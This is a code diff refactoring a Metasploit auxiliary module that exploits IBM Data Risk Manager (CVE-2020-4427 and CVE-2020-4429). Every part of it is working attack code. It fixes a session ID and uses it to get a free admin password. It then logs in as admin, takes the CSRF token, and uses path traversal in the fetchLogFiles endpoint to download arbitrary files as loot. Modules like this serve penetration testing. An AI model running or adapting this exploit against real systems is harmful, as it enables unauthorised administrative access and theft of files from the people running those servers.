@@ -35,8 +35,8 @@ class MetasploitModule < Msf::Auxiliary
           [
             [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
             [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],
-            [ 'CVE', '2020-4427' ],   # auth bypass
-            [ 'CVE', '2020-4429' ],   # insecure default password
+            [ 'CVE', '2020-4427' ], # auth bypass
+            [ 'CVE', '2020-4429' ], # insecure default password
           ],
         'DisclosureDate' => 'Apr 21 2020'
       )
@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Unknown
   end
 
-  def run
+  def create_session_id
     # step 1: create a session ID and try to make it stick
     session_id = Rex::Text.rand_text_alpha(5..12)
     res = send_request_cgi({
@@ -90,6 +90,10 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{peer} - Successfully \"stickied\" our session ID #{session_id}")
     end
 
+    session_id
+  end
+
+  def free_the_admin(session_id)
     # step 2: give the session ID to the server and have it grant us a free admin password
     post_data = Rex::MIME::Message.new
     post_data.add_part('', nil, nil, content_disposition = 'form-data; name="deviceid"')
@@ -104,77 +108,97 @@ class MetasploitModule < Msf::Auxiliary
       'data' => post_data.to_s,
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
     })
-    if res && (res.code == 200) && res.body[/\"data\":\"([0-9a-f\-]{36})/]
-      password = Regexp.last_match(1)
-      print_good("#{peer} - We have obtained a new admin password #{password}")
-    else
+
+    unless res && (res.code == 200) && res.body[/\"data\":\"([0-9a-f\-]{36})/]
       fail_with(Failure::Unknown, "#{peer} - Failed to obtain the admin password.")
     end
 
+    password = Regexp.last_match(1)
+    print_good("#{peer} - We have obtained a new admin password #{password}")
+
+    password
+  end
+
+  def login_and_csrf(password)
     # step 3: login and get an authenticated cookie
     res = send_request_cgi({
-      'uri' => normalize_uri(datastore['targeturi'], 'albatross', 'login'),
+      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'login'),
       'method' => 'POST',
       'vars_post' => {
         'userName' => 'admin',
         'password' => password
       }
     })
-    if res && (res.code == 302) && res.get_cookies
-      print_good("#{peer} - We're now authenticated as admin!")
-      cookie = res.get_cookies
-      url = res.redirection.to_s
+    unless res && (res.code == 302) && res.get_cookies
+      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate as an admin.")
+    end
 
-      # step 4: obtain csrf header in order to be able to make valid requests
-      res = send_request_cgi({
-        'uri' => url,
-        'method' => 'GET',
-        'cookie' => cookie
-      })
-      if res && (res.code == 200) && res.body =~ /var csrfToken \= \"([0-9a-f\-]{36})\";/
-        # step 5: download the file!
-        csrf = Regexp.last_match(1)
-        post_data = %({"instanceId":"local_host","logLevel":"DEBUG","logFileNameList":"../../../../..#{datastore['FILEPATH']}"})
+    print_good("#{peer} - ... and are authenticated as an admin!")
+    cookie = res.get_cookies
+    url = res.redirection.to_s
 
-        res = send_request_cgi({
-          'uri' => normalize_uri(datastore['targeturi'], 'albatross', 'eurekaservice', 'fetchLogFiles'),
-          'method' => 'POST',
-          'cookie' => cookie,
-          'headers' => { 'CSRF-TOKEN' => csrf },
-          'data' => post_data.to_s,
-          'ctype' => 'text/json'
-        })
+    # step 4: obtain CSRF header in order to be able to make valid requests
+    res = send_request_cgi({
+      'uri' => url,
+      'method' => 'GET',
+      'cookie' => cookie
+    })
 
-        if res && (res.code == 200) && !res.body.empty?
-          Zip::File.open_buffer(res.body) do |zipfile|
-            # Not sure what happens if we receive garbage that's not a ZIP file, but that shouldn't
-            # happen? Either we get nothing or a proper zip file.
-            file = zipfile.find_entry(File.basename(datastore['FILEPATH']))
-            if file
-              filedata = zipfile.read(file)
-              vprint_line(filedata.to_s)
-              fname = File.basename(datastore['FILEPATH'])
+    unless res && (res.code == 200) && res.body =~ /var csrfToken \= \"([0-9a-f\-]{36})\";/
+      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate obtain CSRF cookie.")
+    end
+    csrf = Regexp.last_match(1)
 
-              path = store_loot(
-                'IBM_DRM.http',
-                'application/octet-stream',
-                datastore['RHOST'],
-                filedata,
-                fname
-              )
-              print_good("File saved in: #{path}")
-            else
-              fail_with(Failure::Unknown, "#{peer} - Incorrect file downloaded!")
-            end
-          end
-        else
-          fail_with(Failure::Unknown, "#{peer} - Failed to download file #{datastore['FILEPATH']}")
-        end
-      else
-        fail_with(Failure::Unknown, "#{peer} - Failed to obtain authenticated CSRF cookie.")
+    return cookie, csrf
+  end
+
+  def run
+    # step 1: create a session ID and try to make it stick
+    session_id = create_session_id
+
+    # step 2: give the session ID to the server and have it grant us a free admin password
+    password = free_the_admin(session_id)
+
+    # step 3: login and get an authenticated cookie
+    # step 4: obtain CSRF header in order to be able to make valid requests
+    cookie, csrf = login_and_csrf(password)
+
+    # step 5: download the file!
+    post_data = %({"instanceId":"local_host","logLevel":"DEBUG","logFileNameList":"../../../../..#{datastore['FILEPATH']}"})
+
+    res = send_request_cgi({
+      'uri' => normalize_uri(datastore['targeturi'], 'albatross', 'eurekaservice', 'fetchLogFiles'),
+      'method' => 'POST',
+      'cookie' => cookie,
+      'headers' => { 'CSRF-TOKEN' => csrf },
+      'data' => post_data.to_s,
+      'ctype' => 'text/json'
+    })
+
+    unless res && (res.code == 200) && !res.body.empty?
+      fail_with(Failure::Unknown, "#{peer} - Failed to download file #{datastore['FILEPATH']}")
+    end
+
+    Zip::File.open_buffer(res.body) do |zipfile|
+      # Not sure what happens if we receive garbage that's not a ZIP file, but that shouldn't
+      # happen? Either we get nothing or a proper zip file.
+      file = zipfile.find_entry(File.basename(datastore['FILEPATH']))
+      unless file
+        fail_with(Failure::Unknown, "#{peer} - Incorrect file downloaded!")
       end
-    else
-      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate as admin.")
+
+      filedata = zipfile.read(file)
+      vprint_line(filedata.to_s)
+      fname = File.basename(datastore['FILEPATH'])
+
+      path = store_loot(
+        'IBM_DRM.http',
+        'application/octet-stream',
+        datastore['RHOST'],
+        filedata,
+        fname
+      )
+      print_good("File saved in: #{path}")
     end
   end
 end
